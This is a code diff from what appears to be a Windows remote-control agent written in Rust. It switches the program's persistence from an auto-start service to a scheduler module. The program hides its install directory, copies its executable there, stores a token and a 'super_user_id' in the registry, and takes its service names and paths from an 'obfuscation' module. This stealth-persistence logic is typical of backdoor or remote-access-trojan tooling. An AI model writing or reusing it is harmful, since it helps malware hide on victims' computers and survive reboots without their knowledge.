@@ -2,13 +2,10 @@ use std::os::windows::ffi::OsStrExt;
 use std::path::PathBuf;
 
 use anyhow::{Context, Result};
-use windows_service::service::{
-    ServiceAccess, ServiceErrorControl, ServiceInfo, ServiceStartType, ServiceType,
-};
-use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};
 
 use crate::security::obfuscation;
 
+/// Remove leftover .old files from previous self-updates.
 pub fn cleanup_old_files() {
     let home = obfuscation::install_home();
     if let Ok(entries) = std::fs::read_dir(home) {
@@ -20,11 +17,14 @@ pub fn cleanup_old_files() {
     }
 }
 
-pub fn setup_home_dir() -> Result<(PathBuf, PathBuf)> {
+/// Ensure home dir exists, mark as hidden, copy exe if not already there.
+/// Returns `(home_dir, target_exe_path)`.
+fn setup_home_dir() -> Result<(PathBuf, PathBuf)> {
     let home = obfuscation::install_home();
     std::fs::create_dir_all(home)
         .with_context(|| format!("cannot create home dir: {}", home.display()))?;
 
+    // Mark directory as hidden.
     let attrs = unsafe {
         windows_sys::Win32::Storage::FileSystem::GetFileAttributesW(
             home.as_os_str().encode_wide().collect::<Vec<_>>().as_ptr(),
@@ -66,54 +66,14 @@ pub fn setup_home_dir() -> Result<(PathBuf, PathBuf)> {
 
 pub fn install(token: &str, super_user_id: i64) -> Result<()> {
     super::config::save_to_registry(token, super_user_id)?;
-
-    let (_home, exe_path) = setup_home_dir()?;
-
-    let manager =
-        ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CREATE_SERVICE)
-            .context("cannot open SCM")?;
-
-    let service_name = obfuscation::service_name();
-    let display_name = obfuscation::service_display();
-
-    let service_info = ServiceInfo {
-        name: service_name.into(),
-        display_name: display_name.into(),
-        service_type: ServiceType::OWN_PROCESS,
-        start_type: ServiceStartType::AutoStart,
-        error_control: ServiceErrorControl::Normal,
-        executable_path: exe_path,
-        launch_arguments: vec![],
-        dependencies: vec![],
-        account_name: None,
-        account_password: None,
-    };
-
-    let service = manager
-        .create_service(&service_info, ServiceAccess::CHANGE_CONFIG)
-        .context("cannot create service")?;
-
-    service
-        .set_failure_actions_on_non_crash_failures(true)
-        .context("cannot set failure actions")?;
-
-    log::info!("Service installed successfully");
+    let (_, exe_path) = setup_home_dir()?;
+    super::scheduler::install(&exe_path)?;
+    log::info!("Installed successfully");
     Ok(())
 }
 
 pub fn uninstall() -> Result<()> {
-    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)
-        .context("cannot open SCM")?;
-
-    let service_name = obfuscation::service_name();
-    let service = manager
-        .open_service(service_name, ServiceAccess::DELETE | ServiceAccess::STOP)
-        .context("cannot open service")?;
-
-    let _ = service.stop();
-
-    service.delete().context("cannot delete service")?;
-    log::info!("Service deleted");
+    let _ = super::scheduler::uninstall();
 
     let home = obfuscation::install_home();
     if home.exists() {
@@ -122,6 +82,6 @@ pub fn uninstall() -> Result<()> {
         log::info!("Removed home dir: {}", home.display());
     }
 
-    log::info!("Service uninstalled successfully");
+    log::info!("Uninstalled successfully");
     Ok(())
 }
